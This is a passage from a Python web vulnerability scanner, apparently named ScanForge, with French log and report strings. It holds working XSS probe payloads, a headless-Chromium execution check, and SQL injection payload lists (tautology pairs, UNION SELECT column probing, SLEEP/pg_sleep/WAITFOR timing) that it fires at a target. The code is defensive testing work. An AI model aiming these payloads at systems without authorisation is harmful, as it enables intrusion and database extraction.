       indicate the payload was reflected without HTML-entity encoding.
       Tokens must appear NEAR the marker (within ~500 chars) to avoid
       false positives from the page's own scripts.
    HTML-entity encoded output is intentionally not decoded here: entities
    rendered as text are not executable markup. Browser-side consumption is
    validated separately by the dynamic DOM probe.
    """
    # A value echoed by a JSON API is data, not executable HTML by itself.
    # Browser-side consumption is covered separately by the DOM-XSS probe.
    if "json" in content_type.lower():
        return False
    stripped = response_text.lstrip()
    if stripped.startswith(("{", "[")):
        try:
            json.loads(response_text)
            return False
        except (json.JSONDecodeError, ValueError):
            pass

    # 1. Exact match
    if payload in response_text:
        return True

    # 2. Proximity-based check: marker + dangerous tokens must appear near each other
    lowered = response_text.lower()
    marker_lower = _XSS_MARKER.lower()

    # Our marker must appear somewhere for this to be a reflection
    if marker_lower not in lowered:
        return False

    dangerous_tokens = (
        "<script", "</script>", "<svg", "<img", "<body", "<details", "<marquee",
        "<iframe", "javascript:",
    )

    # Find all positions where the marker appears and check if any dangerous
    # token is within a ~500 char window around it
    marker_pos = 0
    while True:
        idx = lowered.find(marker_lower, marker_pos)
        if idx == -1:
            break
        window_start = max(0, idx - 500)
        window_end = min(len(lowered), idx + len(marker_lower) + 500)
        window = lowered[window_start:window_end]
        if any(token in window for token in dangerous_tokens):
            return True
        marker_pos = idx + 1

    return False


def _canary_reflects(session, candidate, timeout):
    """Inject a unique canary string and check if it's reflected in the response.

    Returns (reflects, response_text) — if the canary reflects, there's a high
    chance that XSS payloads will also reflect if the app doesn't encode output.
    """
    canary = f"SCANCANARY{uuid.uuid4().hex[:8]}"
    try:
        response = _send_candidate(session, candidate, canary, timeout)
        return canary in response.text, response.text
    except requests.exceptions.RequestException:
        return False, ""


def _find_chromium_browser(options=None):
    """Return an installed Chromium-family browser for DOM execution checks."""
    options = options or {}
    configured = options.get("browser_path") or os.getenv("SCANNER_BROWSER_PATH")
    candidates = [configured] if configured else []

    for command in ("chrome", "google-chrome", "chromium", "chromium-browser", "msedge"):
        resolved = shutil.which(command)
        if resolved:
            candidates.append(resolved)

    program_files = os.environ.get("ProgramFiles", "")
    program_files_x86 = os.environ.get("ProgramFiles(x86)", "")
    local_app_data = os.environ.get("LOCALAPPDATA", "")
    candidates.extend(
        [
            os.path.join(program_files, "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(program_files_x86, "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(local_app_data, "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(program_files, "Microsoft", "Edge", "Application", "msedge.exe"),
            os.path.join(program_files_x86, "Microsoft", "Edge", "Application", "msedge.exe"),
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge",
        ]
    )

    seen = set()
    for candidate in candidates:
        if not candidate:
            continue
        candidate = os.path.abspath(os.path.expandvars(os.path.expanduser(candidate)))
        if candidate not in seen and os.path.isfile(candidate):
            return candidate
        seen.add(candidate)
    return None


def _looks_like_spa_html(html_text):
    """Recognize common SPA entry documents without tying detection to Juice Shop."""
    lowered = html_text.lower()
    indicators = (
        "<app-root",
        "<router-outlet",
        'id="root"',
        "id='root'",
        'id="app"',
        "id='app'",
        "__next_data__",
        "ng-version=",
    )
    has_app_mount = any(indicator in lowered for indicator in indicators)
    has_script_bundle = bool(
        re.search(r"<script[^>]+src=[\"'][^\"']*(?:main|runtime|bundle|app)[^\"']*\.js", lowered)
    )
    return has_app_mount or has_script_bundle


def _dom_probe_routes(url_cible):
    """Return fragment routes to test, including a route supplied by the user."""
    routes = list(DOM_XSS_ROUTES)
    fragment = urlsplit(url_cible).fragment
    if fragment:
        fragment_path, _, fragment_query = fragment.partition("?")
        params = parse_qsl(fragment_query, keep_blank_values=True)
        for param, _ in params:
            if param.lower() in XSS_PARAM_NAMES:
                normalized_route = f"#{fragment_path if fragment_path.startswith('/') else '/' + fragment_path}"
                routes.insert(0, (normalized_route, param))

    unique = []
    seen = set()
    for route in routes:
        if route not in seen:
            seen.add(route)
            unique.append(route)
    return unique


def _build_dom_probe_url(root, route, param, execution_marker):
    """Build a harmless browser payload with a separate execution side effect."""
    input_marker = f"INPUT_{execution_marker}"
    payload = (
        f'<img src="/scanforge-missing-{input_marker}" data-scanforge-probe="{input_marker}" '
        f'onerror="document.documentElement.setAttribute(\'{DOM_XSS_ATTRIBUTE}\',\'{execution_marker}\')">'
    )
    query = urlencode({param: payload}, quote_via=quote)
    return f"{root.rstrip('/')}/{route}?{query}"


def _dom_execution_confirmed(rendered_dom, execution_marker):
    """Require the marker on the root HTML element, not merely in payload text."""
    pattern = (
        rf"<html\b[^>]*\b{re.escape(DOM_XSS_ATTRIBUTE)}\s*=\s*"
        rf"([\"']){re.escape(execution_marker)}\1"
    )
    return re.search(pattern, rendered_dom, flags=re.IGNORECASE | re.DOTALL) is not None


def _run_browser_dump(browser, url, timeout, virtual_time_ms=None):
    """Return (state, DOM) where state is completed, timed_out, or error."""
    # Chrome must be able to lock its profile. Keeping the temporary profile
    # inside the writable project tree also works in restricted environments.
    profile_dir = tempfile.mkdtemp(
        prefix="scanforge-browser-", dir=os.path.dirname(__file__)
    )
    process = None
    try:
        command = [
            browser,
            "--headless=new",
            "--disable-gpu",
            "--disable-extensions",
            "--disable-background-networking",
            "--disable-breakpad",
            "--disable-crash-reporter",
            "--no-first-run",
            "--no-default-browser-check",
            "--ignore-certificate-errors",
            f"--user-data-dir={profile_dir}",
            f"--virtual-time-budget={virtual_time_ms or max(5000, timeout * 1000)}",
            "--dump-dom",
            url,
        ]
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        try:
            stdout, _ = process.communicate(timeout=timeout)
            if process.returncode != 0:
                return "error", ""
            return "completed", stdout
        except subprocess.TimeoutExpired:
            process.kill()
            try:
                process.communicate(timeout=2)
            except subprocess.TimeoutExpired:
                pass
            return "timed_out", ""
    except OSError:
        return "error", ""
    finally:
        if process is not None and process.poll() is None:
            process.kill()
        shutil.rmtree(profile_dir, ignore_errors=True)


def _browser_alert_executes(browser, control_url, probe_url, timeout):
    """Confirm execution when a JavaScript dialog blocks an otherwise healthy dump."""
    control_state, _ = _run_browser_dump(
        browser, control_url, max(DOM_BROWSER_TIMEOUT, timeout + 8)
    )
    if control_state != "completed":
        return False
    probe_state, _ = _run_browser_dump(
        browser,
        probe_url,
        max(7, min(12, timeout + 2)),
        virtual_time_ms=max(5000, timeout * 1000),
    )
    return probe_state == "timed_out"


def _run_dom_xss_probe(browser, root, route, param, timeout):
    """Execute one fragment payload in headless Chromium and inspect the live DOM."""
    execution_marker = f"EXEC_{uuid.uuid4().hex}"
    probe_url = _build_dom_probe_url(root, route, param, execution_marker)
    browser_timeout = max(DOM_BROWSER_TIMEOUT, timeout + 8)
    state, rendered_dom = _run_browser_dump(browser, probe_url, browser_timeout)

    if state == "completed" and _dom_execution_confirmed(rendered_dom, execution_marker):
        return {
            "route": route,
            "param": param,
            "url": probe_url,
            "browser": os.path.basename(browser),
            "confirmation": "marqueur DOM",
        }

    control_url = (
        f"{root.rstrip('/')}/{route}?"
        + urlencode({param: "SCANFORGE_CONTROL"}, quote_via=quote)
    )
    alert_payload = '<iframe src="javascript:alert(\'SCANFORGE_XSS\')">'
    alert_url = (
        f"{root.rstrip('/')}/{route}?"
        + urlencode({param: alert_payload}, quote_via=quote)
    )
    if _browser_alert_executes(browser, control_url, alert_url, timeout):
        return {
            "route": route,
            "param": param,
            "url": alert_url,
            "browser": os.path.basename(browser),
            "confirmation": "dialogue JavaScript exécuté",
        }
    return None


def _run_reflected_xss_probe(browser, candidate, timeout):
    """Confirm a reflected GET candidate by observing a browser side effect."""
    if not browser or candidate.get("method", "get").lower() != "get":
        return False
    execution_marker = f"EXEC_{uuid.uuid4().hex}"
    input_marker = f"INPUT_{execution_marker}"
    payload = (
        f'<img src="/scanforge-missing-{input_marker}" '
        f'onerror="document.documentElement.setAttribute(\'{DOM_XSS_ATTRIBUTE}\',\'{execution_marker}\')">'
    )
    data = dict(candidate.get("base_data", {}))
    data[candidate["param"]] = payload
    probe_url = _with_params(candidate["url"], data)
    browser_timeout = max(DOM_BROWSER_TIMEOUT, timeout + 8)
    state, rendered_dom = _run_browser_dump(browser, probe_url, browser_timeout)
    if state == "completed" and _dom_execution_confirmed(rendered_dom, execution_marker):
        return True

    control_data = dict(candidate.get("base_data", {}))
    control_data[candidate["param"]] = "SCANFORGE_CONTROL"
    control_url = _with_params(candidate["url"], control_data)
    alert_data = dict(candidate.get("base_data", {}))
    alert_data[candidate["param"]] = (
        '<iframe src="javascript:alert(\'SCANFORGE_XSS\')">'
    )
    alert_url = _with_params(candidate["url"], alert_data)
    return _browser_alert_executes(browser, control_url, alert_url, timeout)


def _static_dom_xss_evidence(session, entry_response, root, timeout):
    """Find a browser source/sink pair in same-origin JavaScript bundles.

    This is deliberately a fallback: it reports a potential DOM XSS only when
    dynamic browser confirmation is unavailable or unsuccessful.
    """
    parser = _parse_page(entry_response)
    sources = (
        "queryparammap",
        "queryparams",
        "activatedroute",
        "location.hash",
        "window.location",
        "urlsearchparams",
    )
    sinks = (
        "bypasssecuritytrusthtml",
        "dangerouslysetinnerhtml",
        ".innerhtml",
        "[innerhtml]",
        "insertadjacenthtml",
        "document.write",
    )
    route_hints = ("#/search", 'path:"search"', "path:'search'", "/search")

    total_bytes = 0
    for script_src in parser.scripts[:12]:
        script_url = urljoin(entry_response.url, script_src)
        if not same_origin(script_url, root):
            continue
        try:
            response = session.get(script_url, timeout=timeout, allow_redirects=True)
        except requests.exceptions.RequestException:
            continue
        if response.status_code >= 400:
            continue
        total_bytes += len(response.content)
        if total_bytes > 12_000_000:
            break
        lowered = response.text.lower()
        source = next((token for token in sources if token in lowered), None)
        sink = next((token for token in sinks if token in lowered), None)
        route_hint = next((token for token in route_hints if token in lowered), None)
        if source and sink and route_hint:
            return {
                "script": urlparse(script_url).path,
                "source": source,
                "sink": sink,
                "route": route_hint,
            }
    return None


def _discover_dom_routes(session, entry_response, root, timeout, max_scripts=8):
    """Discover fragment routes and parameter names from SPA markup/bundles."""
    parser = _parse_page(entry_response)
    sources = [entry_response.text]
    total_bytes = 0
    for script_src in parser.scripts[:max_scripts]:
        script_url = urljoin(entry_response.url, script_src)
        if not same_origin(script_url, root):
            continue
        try:
            response = session.get(script_url, timeout=timeout, allow_redirects=True)
        except requests.exceptions.RequestException:
            continue
        if response.status_code >= 400:
            continue
        total_bytes += len(response.content)
        if total_bytes > 15_000_000:
            break
        sources.append(response.text.replace("\\/", "/"))

    routes = []
    for source in sources:
        for route, param in re.findall(
            r"#(/[A-Za-z0-9_./:-]{1,120})\?([A-Za-z_][A-Za-z0-9_-]*)=",
            source,
        ):
            if param.lower() in XSS_PARAM_NAMES:
                routes.append((f"#{route}", param))
        for route in re.findall(
            r"\bpath\s*:\s*[\"']([A-Za-z0-9_./:-]{1,120})[\"']",
            source,
        ):
            lowered = route.lower()
            if "search" in lowered or "find" in lowered:
                routes.append((f"#/{route.lstrip('/')}", "q"))
            elif "track" in lowered or "result" in lowered:
                routes.append((f"#/{route.lstrip('/')}", "id"))
    return list(dict.fromkeys(routes))


def _detect_dom_xss(session, url_cible, root, timeout, options=None):
    """Detect browser-side XSS that an HTTP response scanner cannot observe."""
    try:
        entry_response = session.get(root, timeout=timeout, allow_redirects=True)
    except requests.exceptions.RequestException:
        return []
    if entry_response.status_code >= 400 or not _looks_like_spa_html(entry_response.text):
        return []

    findings = []
    browser = _find_chromium_browser(options)
    if browser:
        max_routes = get_depth_config(options)["max_dom_routes"]
        discovered_routes = _discover_dom_routes(
            session, entry_response, root, timeout,
            get_depth_config(options)["fuzzer_max_scripts"],
        )
        routes = list(dict.fromkeys(discovered_routes + _dom_probe_routes(url_cible)))
        for route, param in routes[:max_routes]:
            result = _run_dom_xss_probe(browser, root, route, param, timeout)
            if result:
                findings.append({"confirmed": True, **result})

    if findings:
        return findings

    evidence = _static_dom_xss_evidence(session, entry_response, root, timeout)
    if evidence:
        return [{"confirmed": False, **evidence}]
    return []


# ─── SQLi Detection ──────────────────────────────────────────────────────────

def _contains_sql_error(text):
    lowered = text.lower()
    found = any(error in lowered for error in SQL_ERRORS)
    if not found:
        # Also check JSON error responses (common in REST APIs)
        # e.g., {"error": {"message": "SQLITE_ERROR: ..."}}
        try:
            import json
            if text.strip().startswith('{'):
                data = json.loads(text)
                # Recursively check all string values in the JSON for SQL errors
                json_text = json.dumps(data).lower()
                found = any(error in json_text for error in SQL_ERRORS)
        except (json.JSONDecodeError, ValueError):
            pass
    return found


def _token_count(text, tokens):
    lowered = text.lower()
    return sum(lowered.count(token) for token in tokens)


def _is_boolean_sqli(baseline, true_response, false_response):
    """Detect boolean-based blind SQLi by comparing true/false responses.

    Relaxed thresholds compared to original to catch more real-world cases
    like DVWA where the page template is identical but data rows differ.
    """
    true_text = true_response.text
    false_text = false_response.text

    # 1. SQL error in either response → immediate detection
    baseline_has_error = baseline is not None and _contains_sql_error(baseline.text)
    if not baseline_has_error and (
        _contains_sql_error(true_text) or _contains_sql_error(false_text)
    ):
        return True, "Une réponse contient une erreur SQL."

    # 2. Status divergence is useful only if the true branch still resembles
    # the normal response. Otherwise this is likely ordinary input validation.
    if (
        baseline is not None
        and true_response.status_code == baseline.status_code
        and false_response.status_code >= 400
        and true_response.status_code != false_response.status_code
        and _similar(true_response.text, baseline.text) > 0.75
        and _similar(false_response.text, baseline.text) < 0.65
    ):
        return (
            True,
            "Le payload vrai reproduit la réponse normale alors que le payload faux est rejeté.",
        )

    true_len = len(true_text)
    false_len = len(false_text)
    length_gap = abs(true_len - false_len)
    similarity = _similar(true_text, false_text)

    # 3. Result token analysis
    true_results = _token_count(true_text, RESULT_TOKENS)
    false_results = _token_count(false_text, RESULT_TOKENS)
    true_no_results = _token_count(true_text, NO_RESULT_TOKENS)
    false_no_results = _token_count(false_text, NO_RESULT_TOKENS)

    # Relaxed: true has more results OR false has more "no result" markers
    if true_results >= false_results + 2 and false_no_results > true_no_results:
        return (
            True,
            "Le payload vrai retourne des résultats alors que le payload faux retourne une page vide/non trouvée.",
        )

    if true_results > false_results and false_no_results >= true_no_results + 1:
        return (
            True,
            "Le payload vrai montre plus de données que le payload faux qui affiche un message d'absence.",
        )

    # 4. HTML table row difference (key for DVWA-style apps)
    true_rows = _count_table_rows(true_text)
    false_rows = _count_table_rows(false_text)
    if true_rows >= false_rows + 2:
        return (
            True,
            f"Le payload vrai retourne {true_rows} lignes de tableau contre {false_rows} pour le faux.",
        )

    # 5. Length/similarity divergence
    min_len = min(true_len, false_len) if min(true_len, false_len) > 0 else 1
    if length_gap > max(120, min_len * 0.15) and similarity < 0.88:
        return True, "Les réponses vrai/faux sont significativement différentes."

    # 6. Pure length difference as standalone heuristic (for very short pages)
    if min_len < 300 and length_gap > 50 and similarity < 0.90:
        return True, "Les réponses sont de longueurs significativement différentes pour des pages courtes."

    # 7. Baseline comparison (if available)
    if baseline is not None:
        base_text = baseline.text
        true_vs_base = _similar(true_text, base_text)
        false_vs_base = _similar(false_text, base_text)
        if true_vs_base > 0.70 and false_vs_base < 0.55:
            return (
                True,
                "La réponse vraie ressemble à la page normale alors que la réponse fausse diffère fortement.",
            )
        # Also check: false looks like baseline but true is very different (data dump)
        if false_vs_base > 0.70 and true_vs_base < 0.55:
            return (
                True,
                "Le payload vrai provoque un changement majeur de la page (possible extraction de données).",
            )

    return False, ""


def _sqli_payload_pairs(original):
    original = str(original or "1")
    return [
        # Numeric context
        (f"{original} OR 1=1", f"{original} AND 1=2"),
        (f"{original} OR 1=1-- -", f"{original} AND 1=2-- -"),
        (f"{original} OR 1=1#", f"{original} AND 1=2#"),
        (f"{original} OR 1=1/*", f"{original} AND 1=2/*"),
        # Single quoted context
        (f"{original}' OR '1'='1", f"{original}' AND '1'='2"),
        (f"{original}' OR '1'='1'-- -", f"{original}' AND '1'='2'-- -"),
        (f"{original}' OR '1'='1'#", f"{original}' AND '1'='2'#"),
        ("' OR '1'='1", "' AND '1'='2"),
        ("' OR '1'='1'-- -", "' AND '1'='2'-- -"),
        ("' OR 1=1-- -", "' AND 1=2-- -"),
        ("' OR 1=1#", "' AND 1=2#"),
        # Double quoted context
        (f'{original}" OR "1"="1', f'{original}" AND "1"="2'),
        (f'{original}" OR "1"="1"-- -', f'{original}" AND "1"="2"-- -'),
        ('" OR "1"="1"-- -', '" AND "1"="2"-- -'),
        # Parenthesized context
        (f"{original}') OR ('1'='1", f"{original}') AND ('1'='2"),
        ("') OR ('1'='1'-- -", "') AND ('1'='2'-- -"),
        (f"{original}') OR 1=1-- -", f"{original}') AND 1=2-- -"),
        # LIKE-based (for search forms)
        (f"{original}%' OR '1'='1'-- -", f"{original}%' AND '1'='2'-- -"),
        (f"{original}%' OR 1=1-- -", f"{original}%' AND 1=2-- -"),
    ]


def _sqli_error_payloads(original):
    original = str(original or "1")
    return [
        f"{original}'",
        f'{original}"',
        f"{original}')",
        f'{original}")',
        "'",
        '"',
        "')",
        '")',
        "\\",
        f"{original}' AND '",
        f"{original}'; --",
        "1' OR '1'='1' /*",
        "' UNION SELECT NULL-- -",
    ]


# ─── UNION-based SQLi ────────────────────────────────────────────────────────

def _test_union_sqli(session, candidate, original, timeout, max_columns=6):
    """Test for UNION-based SQL injection.

    Strategy:
    1. Use ORDER BY to probe column count (incrementing until error).
    2. Attempt UNION SELECT with the discovered column count.
    3. Use a unique marker to confirm data extraction.
    """
    original = str(original or "1")
    marker = f"SQLI_{uuid.uuid4().hex[:6]}"

    # If a plain value is reflected, the marker in a UNION response would not
    # prove database extraction. Skip UNION confirmation for that candidate.
    try:
        reflection_control = _send_candidate(session, candidate, marker, timeout)
        marker_reflects = marker in reflection_control.text
    except requests.exceptions.RequestException:
        marker_reflects = False

    # Phase 1: Determine column count via ORDER BY
    # Reduced max columns and permutations for speed
    col_count = 0
    # Probe one position beyond the desired maximum so a failure at N+1 can
    # confirm an N-column query.
    for n in range(1, max(2, max_columns) + 2):
        for prefix in (
            f"{original}' ORDER BY {n}-- -",
            f"{original} ORDER BY {n}-- -",
        ):
            try:
                resp = _send_candidate(session, candidate, prefix, timeout)
            except requests.exceptions.RequestException:
                continue

            if _is_auth_redirect(resp, candidate["url"]):
                continue

            if resp.status_code >= 500 or _contains_sql_error(resp.text):
                if n > 1:
                    col_count = n - 1
                break
        if col_count:
            break

    if col_count == 0:
        col_count_candidates = [1, 2, 3, 4]
    else:
        col_count_candidates = [col_count]

    # Phase 2: UNION SELECT with marker
    for nc in col_count_candidates:
        columns = ",".join(
            [f"'{marker}'" if i == 0 else "NULL" for i in range(nc)]
        )
        for prefix_tpl in (
            f"{original}' UNION SELECT {columns}-- -",
            f"{original} UNION SELECT {columns}-- -",
            f"' UNION SELECT {columns}-- -",
        ):
                try:
                    resp = _send_candidate(session, candidate, prefix_tpl, timeout)
                except requests.exceptions.RequestException:
                    continue

                if _is_auth_redirect(resp, candidate["url"]):
                    continue

                if marker in resp.text and not marker_reflects:
                    return (
                        True,
                        f"UNION SELECT avec {nc} colonne(s) extrait des données. "
                        f"Le marqueur '{marker}' apparaît dans la réponse.",
                    )

    return False, ""


# ─── Time-based Blind SQLi ───────────────────────────────────────────────────

def _test_time_sqli(session, candidate, original, timeout, baseline_time):
    """Test for time-based blind SQL injection.

    Sends SLEEP/WAITFOR/pg_sleep payloads and measures response time.
    A positive is confirmed when the response takes TIME_THRESHOLD seconds
    longer than the measured baseline.
    """
    original = str(original or "1")
    sleep_s = TIME_SLEEP_SECONDS

    time_payloads = [
        # MySQL / General
        f"{original}' AND SLEEP({sleep_s})-- -",
        f"{original} AND SLEEP({sleep_s})-- -",
        f"' AND SLEEP({sleep_s})-- -",
        # PostgreSQL
        f"{original}' AND pg_sleep({sleep_s})-- -",
        f"{original} AND pg_sleep({sleep_s})-- -",
        # SQL Server
        f"{original}'; WAITFOR DELAY '0:0:{sleep_s}';-- -",
        # SQLite
        f"{original}' AND 1=randomblob(100000000)-- -",
    ]

    for payload in time_payloads:
        try:
            _, elapsed = _timed_send(session, candidate, payload, timeout)
        except (requests.exceptions.RequestException, requests.exceptions.Timeout):
            # Timeout itself could indicate a successful sleep
            continue

        extra_delay = elapsed - baseline_time
        if extra_delay >= TIME_THRESHOLD:
            # Confirm against a fresh control to reject a one-off network spike.
            try:
                _, control_elapsed = _timed_send(
                    session, candidate, original, timeout
                )
                _, confirmation_elapsed = _timed_send(
                    session, candidate, payload, timeout
                )
            except requests.exceptions.RequestException:
                continue
            if confirmation_elapsed - control_elapsed < TIME_THRESHOLD:
                continue
            return (
                True,
                f"Le payload temporel a provoqué un délai de {elapsed:.1f}s "
                f"(baseline: {baseline_time:.1f}s, surplus: {extra_delay:.1f}s). "
                f"Cela indique une injection SQL aveugle basée sur le temps.",
            )

    return False, ""


# ─── Deduplication helper ────────────────────────────────────────────────────

def _insert_once(
    cursor, scan_id, inserted, key, type_faille, criticite, description, remediation
):
    if key in inserted:
        return False
    inserted.add(key)
    add_vulnerability(cursor, scan_id, type_faille, criticite, description, remediation)
    return True


# ─── Main Entry Point ────────────────────────────────────────────────────────

def tester_injections(url_cible, options=None, _ctx=None):
    """Discover and test inputs for DOM/reflected XSS and SQL injection.

    Detection methods:
    - DOM XSS: harmless side-effect payload executed in headless Chromium, with
      source/sink analysis of JavaScript bundles as a lower-confidence fallback.
    - XSS: Reflected payload detection with canary pre-check, expanded payloads,
      HTML-decoded reflection check, and event handler detection.
    - SQLi Error-based: Break-string payloads that trigger SQL error messages.
    - SQLi Boolean-based: True/false payload pairs with relaxed comparison.
    - SQLi UNION-based: Column count probing + UNION SELECT with marker.
    - SQLi Time-based: SLEEP/pg_sleep/WAITFOR payloads with timing analysis.
    """
    options = options or {}
    root = normalize_target_url(url_cible)
    crawl_root = get_scope_root(url_cible)
    depth_config = get_depth_config(options)
    def _opt(key, env_key, default):
        """Resolve option value, handling 0 correctly (0 is a valid value, not falsy)."""
        val = options.get(key)
        if val is not None:
            return int(val)
        env_val = os.getenv(env_key)
        if env_val is not None:
            return int(env_val)
        return default

    timeout = _opt("timeout", "SCANNER_TIMEOUT", depth_config["timeout"])
    max_pages = _opt("max_pages", "SCANNER_MAX_PAGES", depth_config["max_pages"])
    max_candidates = _opt(
        "max_candidates", "SCANNER_MAX_CANDIDATES", depth_config["max_candidates"]
    )
    max_time_probes = _opt(
        "max_time_probes",
        "SCANNER_MAX_TIME_PROBES",
        depth_config["max_time_probes"],
    )
    max_scripts = int(options.get("max_scripts", depth_config["fuzzer_max_scripts"]))
    max_error_payloads = int(
        options.get("max_error_payloads", depth_config["max_error_payloads"])
    )
    max_boolean_pairs = int(
        options.get("max_boolean_pairs", depth_config["max_boolean_pairs"])
    )
    max_union_columns = int(
        options.get("max_union_columns", depth_config["max_union_columns"])
    )

    print(f"[*] Démarrage des tests d'injection sur : {root}")
    if crawl_root != root:
        print(f"  [i] Portée de découverte: {crawl_root}")

    session = build_session(options)

    if _ctx:
        conn, cursor, scan_id = _ctx
    else:
        conn = connect_db()
        cursor = conn.cursor()
        scan_id = None

    try:
        if not _ctx:
            scan_id, target_url = start_scan(cursor, root)
            conn.commit()
        else:
            target_url = root

        xss_candidates, sqli_candidates = _build_candidates(
            url_cible,
            session,
            target_url,
            crawl_root,
            timeout,
            max_pages,
            max_candidates,
            max_scripts,
        )
        print(
            f"  [i] Candidats XSS: {len(xss_candidates)} | Candidats SQLi: {len(sqli_candidates)}"
        )

        inserted = set()
        findings = 0

        # ── Phase 1: XSS ─────────────────────────────────────────────────
        print("  [>] Phase 1 : Test XSS...")

        # Fragment-based SPA routes never reach the HTTP server, so validate
        # them separately in a real browser DOM before response reflection tests.
        dom_findings = _detect_dom_xss(
            session, url_cible, crawl_root, timeout, options
        )
        for finding in dom_findings:
            if finding.get("confirmed"):
                description = (
                    f"Le paramètre '{finding['param']}' de la route {finding['route']} permet "
                    f"l'exécution de JavaScript dans le DOM. La vulnérabilité a été confirmée "
                    f"dans {finding['browser']} par {finding.get('confirmation', 'un marqueur DOM')}."
                )
                type_faille = "Injection XSS (DOM)"
                severity = "Élevé"
                key = ("dom_xss", finding["route"], finding["param"])
                log_detail = f"{finding['route']} param={finding['param']} (exécution confirmée)"
            else:
                description = (
                    "L'analyse statique du bundle JavaScript a identifié une source contrôlée "
                    f"par l'URL ('{finding['source']}') reliée à un puits HTML dangereux "
                    f"('{finding['sink']}') dans {finding['script']}. Une validation manuelle "
                    "dans le navigateur reste nécessaire."
                )
                type_faille = "Risque XSS (DOM, analyse statique)"
                severity = "Moyen"
                key = ("dom_xss_static", finding["script"], finding["sink"])
                log_detail = f"{finding['script']} (analyse statique)"

            if _insert_once(
                cursor,
                scan_id,
                inserted,
                key,
                type_faille,
                severity,
                description,
                "Ne jamais injecter directement une valeur provenant de l'URL dans innerHTML. Utiliser l'encodage contextuel, les liaisons texte du framework et une Content-Security-Policy restrictive; éviter les API de contournement de la sanitisation.",
            ):
                findings += 1
                print(f"  [+] XSS DOM détectée: {log_detail}")

        xss_browser = _find_chromium_browser(options)
        for candidate in xss_candidates:
            # Step 1: Quick canary check — if the input doesn't reflect at all,
            # skip all payloads for this candidate (huge speed improvement).
            reflects, _ = _canary_reflects(session, candidate, timeout)
            if not reflects:
                continue

            for payload in XSS_PAYLOADS:
                try:
                    response = _send_candidate(session, candidate, payload, timeout)
                except requests.exceptions.RequestException:
                    continue

                if _is_auth_redirect(response, candidate["url"]):
                    break  # No point testing more payloads if auth-redirected

                if _contains_raw_xss(
                    response.text,
                    payload,
                    response.headers.get("Content-Type", ""),
                ):
                    path = urlparse(candidate["url"]).path or "/"
                    browser_confirmed = _run_reflected_xss_probe(
                        xss_browser, candidate, timeout
                    )
                    severity = "Élevé" if browser_confirmed else "Moyen"
                    finding_type = (
                        "Injection XSS (Réfléchie)"
                        if browser_confirmed
                        else "Risque XSS réfléchi (non confirmé)"
                    )
                    validation = (
                        "L'exécution a été confirmée dans un navigateur headless."
                        if browser_confirmed
                        else "La réflexion HTML est confirmée; une validation navigateur manuelle est recommandée."
                    )
                    description = (
                        f"Le paramètre '{candidate['param']}' reflète du HTML/JavaScript non échappé "
                        f"sur {candidate['method'].upper()} {path}. {validation}"
                    )
                    key = (
                        "xss",
                        candidate["method"],
                        candidate["url"],
                        candidate["param"],
                    )
                    if _insert_once(
                        cursor,
                        scan_id,
                        inserted,
                        key,
                        finding_type,
                        severity,
                        description,
                        "Encoder toutes les sorties HTML, valider les entrées côté serveur, éviter l'insertion directe dans le DOM et déployer une Content-Security-Policy restrictive.",
                    ):
                        findings += 1
                        print(
                            f"  [+] XSS détectée: {candidate['method'].upper()} {path} param={candidate['param']}"
                        )
                    break

        # Commit XSS findings immediately so they appear in dashboard
        conn.commit()

        # ── Phase 2: SQLi ─────────────────────────────────────────────────
        print("  [>] Phase 2 : Test SQLi...")
        time_probes_used = 0

        for candidate in sqli_candidates:
            original = candidate.get("base_data", {}).get(
                candidate["param"],
                candidate.get("base_params", {}).get(candidate["param"], "1"),
            )

            # Get baseline response
            baseline = None
            baseline_time = 1.0  # default assumption
            try:
                baseline, baseline_time = _timed_send(
                    session, candidate, original, timeout
                )
            except requests.exceptions.RequestException:
                pass
            if baseline is None:
                continue

            detected = False
            evidence = ""
            method_name = ""
            baseline_sql_error = (
                baseline is not None and _contains_sql_error(baseline.text)
            )

            # ── 2a: Error-based SQLi ──────────────────────────────────────
            for error_payload in _sqli_error_payloads(original)[:max_error_payloads]:
                try:
                    error_response = _send_candidate(
                        session, candidate, error_payload, timeout
                    )
                except requests.exceptions.RequestException:
                    continue
                if _is_auth_redirect(error_response, candidate["url"]):
                    break
                baseline_status = baseline.status_code if baseline is not None else 200
                if (
                    _contains_sql_error(error_response.text)
                    and not baseline_sql_error
                ):
                    try:
                        confirmation = _send_candidate(
                            session, candidate, error_payload, timeout
                        )
                    except requests.exceptions.RequestException:
                        continue
                    if not _contains_sql_error(confirmation.text):
                        continue
                    detected = True
                    evidence = (
                        "Le même payload de rupture de chaîne provoque deux fois "
                        "une erreur SQL visible."
                    )
                    method_name = "Error-based (confirmé deux fois)"
                    break
                if baseline_status < 500 and error_response.status_code >= 500:
                    # Generic 500 without SQL evidence could be WAF/input
                    # validation. Repeat it before reporting a lower-confidence risk.
                    try:
                        confirmation = _send_candidate(
                            session, candidate, error_payload, timeout
                        )
                    except requests.exceptions.RequestException:
                        continue
                    if confirmation.status_code < 500:
                        continue
                    detected = True
                    evidence = (
                        "Le même payload de rupture de chaîne provoque deux fois une erreur serveur (HTTP 500). "
                        "Aucun message SQL explicite n'a été détecté dans la réponse — "
                        "il peut s'agir d'une injection SQL non confirmée ou d'une erreur de validation."
                    )
                    method_name = "Error-based (non confirmé)"
                    break

            # ── 2b: Boolean-based SQLi ────────────────────────────────────
            if not detected:
                pairs = _sqli_payload_pairs(original)[:max_boolean_pairs]
                for true_payload, false_payload in pairs:
                    try:
                        true_response = _send_candidate(
                            session, candidate, true_payload, timeout
                        )
                        false_response = _send_candidate(
                            session, candidate, false_payload, timeout
                        )
                    except requests.exceptions.RequestException:
                        continue

                    if _is_auth_redirect(
                        true_response, candidate["url"]
                    ) or _is_auth_redirect(false_response, candidate["url"]):
                        break

                    detected, evidence = _is_boolean_sqli(
                        baseline, true_response, false_response
                    )
                    if detected:
                        # Confirm once to reject dynamic pages and transient
                        # response differences.
                        try:
                            confirm_true = _send_candidate(
                                session, candidate, true_payload, timeout
                            )
                            confirm_false = _send_candidate(
                                session, candidate, false_payload, timeout
                            )
                            confirmed, confirm_evidence = _is_boolean_sqli(
                                baseline, confirm_true, confirm_false
                            )
